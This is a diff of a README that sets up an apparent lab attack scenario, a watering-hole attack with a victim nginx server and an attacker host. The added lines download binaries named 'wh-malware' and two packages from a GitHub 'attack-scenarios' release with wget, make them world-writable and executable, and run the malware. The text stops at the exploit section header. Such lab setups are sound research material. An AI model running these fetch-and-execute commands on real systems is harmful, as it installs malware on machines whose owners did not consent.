@@ -18,7 +18,7 @@ Ubuntu 16.04: http://mirror.nus.edu.sg/ubuntu-ISO/16.04/
 nginx 1.4.0: http://nginx.org/download/nginx-1.20.2.tar.gz    
 wget 1.20.3: https://ftp.gnu.org/gnu/wget/wget-1.20.3.tar.gz
 
-### deploy
+### Deploy
 
 **Nginx server (Victim IP1)**
 
@@ -48,6 +48,26 @@ cp web-source /home/chuqi
 help: /home/chuqi/local/nginx/sbin/nginx -h
 start: /home/chuqi/local/nginx/sbin/nginx
 stop: /home/chuqi/local/nginx/sbin/nginx -s stop
+```
+
+**Operations (Victim IP1)**
+
+0. Start nginx server
+
+```
+/home/chuqi/local/nginx/sbin/nginx
+```
+
+1. Download several packages via wget 
+```
+wget https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-malware https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg1 https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg2
+
+chmod 777 wh-*
+```
+2. Execute `wh-malware`
+
+```
+./wh-malware
 ```
 
 **Exploit (Attacker IP2)**    
